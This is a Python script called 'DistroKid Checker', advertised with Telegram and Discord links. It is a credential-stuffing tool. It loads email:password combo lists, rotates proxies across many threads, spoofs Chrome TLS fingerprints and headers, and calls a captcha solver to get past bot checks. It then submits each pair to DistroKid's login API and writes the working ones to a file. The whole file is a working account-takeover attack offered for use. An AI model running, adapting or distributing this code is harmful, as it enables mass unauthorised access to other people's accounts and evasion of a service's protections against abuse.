import requests
import tls_client
import re
import concurrent.futures
from loguru import logger
from captcha_Solver import capsolver
from colorama import Fore, Style, init
import random

print(Fore.MAGENTA + r""" 
DistroKid Checker
t.me/kuzeyskrrt / discord.gg/clown / t.me/clownshub                                           
    """)

th = int(input(Fore.MAGENTA + "How Many Thread?"))

def extract_forgot_password_session_id(response_text):
    match = re.search(r'<input type="hidden" id="forgotPasswordSessionID" name="forgotPasswordSessionID" value="(.*?)"', response_text)
    if match:
        return match.group(1)
    return None

def load_proxies(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file]

def login(email, password, proxy):
    session = tls_client.Session(
        client_identifier="chrome128",
        random_tls_extension_order=True
    )
    
    session.proxies = {
        'http': f'http://{proxy}',
        'https': f'http://{proxy}'
    }

    token = capsolver()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': 'https://distrokid.com/product/spotify?utm_source=google&utm_medium=cpc&utm_campaign=DA_DK_Google_ASIA_Search_Brand_DistroKid_ENG_Allplatform_Purchase_EXT-Broad&utm_adgroup=165989608209&utm_term=distrokid%20com&utm_content=712150755591&gad_source=1&gclid=EAIaIQobChMI88e_s66FiQMVtq2DBx3WSBdaEAAYASAAEgIa-vD_BwE',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    params = {
        'forward': '',
    }

    response = session.get('https://distrokid.com/signin/', params=params, headers=headers)

    forgot_password_session_id = extract_forgot_password_session_id(response.text)

    if not forgot_password_session_id:
        logger.warning(f"Forgot Password Session ID not found for {email}.")
        return

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://distrokid.com',
        'priority': 'u=1, i',
        'referer': 'https://distrokid.com/',
        'sec-ch-ua': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'email': email,
        'password': password,
        'sessionid': forgot_password_session_id,  
        'token': token,
        'forgotPasswordSessionID': forgot_password_session_id,  
        'coupon': '',
    }

    response = session.post('https://distrokid.com/api/loginCheck/?now', headers=headers, data=data)

    if response.status_code == 200:
        json_response = response.json()
        if json_response.get('success') == 1:
            logger.success(f"Success for {email}: User ID {json_response['userid']}")
            with open("working.txt", "a") as f:
                f.write(f"{email}:{password}\n")
        else:
            logger.warning(f"Wrong account for {email}: {json_response.get('message')}")
    else:
        logger.error(f"Failed to login for {email}: {response.status_code}")

def load_credentials(filename):
    with open(filename, 'r') as file:
        lines = file.readlines()
    return [line.strip().split(':') for line in lines]

if __name__ == "__main__":
    credentials = load_credentials('combo.txt')

    proxies = load_proxies('proxy.txt')

    with concurrent.futures.ThreadPoolExecutor(max_workers=th) as executor:
        futures = []
        for credential in credentials:
            try:
                email, password = credential  
            except ValueError:
                logger.warning(f"Skipping invalid credential line: {credential}")
                continue 

            proxy = random.choice(proxies)
            futures.append(executor.submit(login, email, password, proxy))

        for future in concurrent.futures.as_completed(futures):
            pass

